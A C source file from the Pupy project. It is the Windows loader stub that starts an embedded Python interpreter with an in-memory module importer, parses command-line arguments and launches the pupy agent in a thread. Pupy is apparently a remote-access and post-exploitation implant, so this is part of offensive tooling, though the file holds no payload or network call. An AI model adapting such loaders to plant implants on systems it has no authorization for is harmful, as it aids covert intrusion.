/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>

#include "revision.h"
#include "pupy_load.h"
#include "debug.h"

#include "Python-dynload.c"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) init_pupy(void);

typedef LPWSTR* (*CommandLineToArgvW_t)(
    LPCWSTR lpCmdLine,
    int     *pNumArgs
);


#ifdef DEBUG
// Redirect early stdout to some file
void redirect_stdout() {
    FILE* new_log;
    char tmpdir[MAX_PATH];
    char tmp[MAX_PATH];

    dprint("Redirect stdout requested\n");

    if (!GetTempPathA(sizeof(tmpdir), tmpdir))
        return;

    dprint("Redirect stdout, tmpdir: %s\n", tmpdir);

    if (!GetTempFileNameA(
            tmpdir,
            "pup",
            0,
            tmp))
        return;

    set_debug_log(tmp);
}
#endif


// https://stackoverflow.com/questions/291424/
LPSTR* CommandLineToArgvA(INT *pNumArgs)
{
    LPWSTR cmdline;
    LPWSTR* args;
    LPSTR* result;
    LPSTR buffer;

    int retval;
    int numArgs;
    int storage;
    int bufLen;
    int i;

    static CommandLineToArgvW_t CommandLineToArgvW_ = NULL;

    if (!CommandLineToArgvW_) {
        HMODULE hShell32 = LoadLibrary("SHELL32.DLL");
        CommandLineToArgvW_ = (CommandLineToArgvW_t) GetProcAddress(
            hShell32, "CommandLineToArgvW");
        dprint("CommandLineToArgvW: %p\n", CommandLineToArgvW_);
    }

    if (!CommandLineToArgvW_) {
        dprint("Failed to load CommandLineToArgvW from SHELL32.DLL\n");
        *pNumArgs = 0;
        return NULL;
    }

    numArgs = 0;

    cmdline = GetCommandLineW();
    if (!cmdline) {
        dprint("Command line not found");
        *pNumArgs = 0;
        return NULL;
    }

    args = CommandLineToArgvW_(cmdline, &numArgs);
    if (args == NULL) {
        *pNumArgs = 0;
        return NULL;
    }

    storage = numArgs * sizeof(LPSTR);
    for (i = 0; i < numArgs; ++ i)
    {
        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, NULL,
            0, NULL, NULL
        );
        if (!SUCCEEDED(retval))
        {
            LocalFree(args);
            *pNumArgs = 0;
            return NULL;
        }

        storage += retval;
    }

    result = (LPSTR*)LocalAlloc(LMEM_FIXED, storage);
    if (result == NULL)
    {
        LocalFree(args);
        *pNumArgs = 0;
        return NULL;
    }

    bufLen = storage - (numArgs * sizeof(LPSTR));
    buffer = ((LPSTR)result) + (numArgs * sizeof(LPSTR));
    for (i = 0; i < numArgs; ++ i)
    {
        if (bufLen < 0) {
            dprint("Buflen exhaused, arg %d (%d/%d)\n", i, bufLen, storage);
            numArgs = i;
            break;
        }

        retval = WideCharToMultiByte(
            CP_UTF8, 0, args[i], -1, buffer,
            bufLen, NULL, NULL
        );

        if (!SUCCEEDED(retval))
        {
            LocalFree(result);
            LocalFree(args);
            *pNumArgs = i;
            return NULL;
        }

        result[i] = buffer;

        buffer += retval;
        bufLen -= retval;
    }

    LocalFree(args);

    *pNumArgs = numArgs;
    return result;
}

DWORD WINAPI mainThread(LPVOID lpArg)
{
    int i, argc = 0;
    char **argv = NULL;

    dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);

#ifdef DEBUG
    redirect_stdout();
#endif

    dprint("Initializing python...\n");
    if (!initialize_python()) {
        return -1;
    }

    dprint("Parsing command line..\n");
    argv = CommandLineToArgvA(&argc);

    for (i=0; i<argc; i++) {
        dprint("ARGV: %d: %s\n", i, argv[i]);
    }

    // no lpArg means shared object
    dprint("Running pupy... (args=%d argv=%p)\n", argc, argv);
    run_pupy(argc, argv, lpArg);

    dprint("Global Exit\n");

    return 0;
}
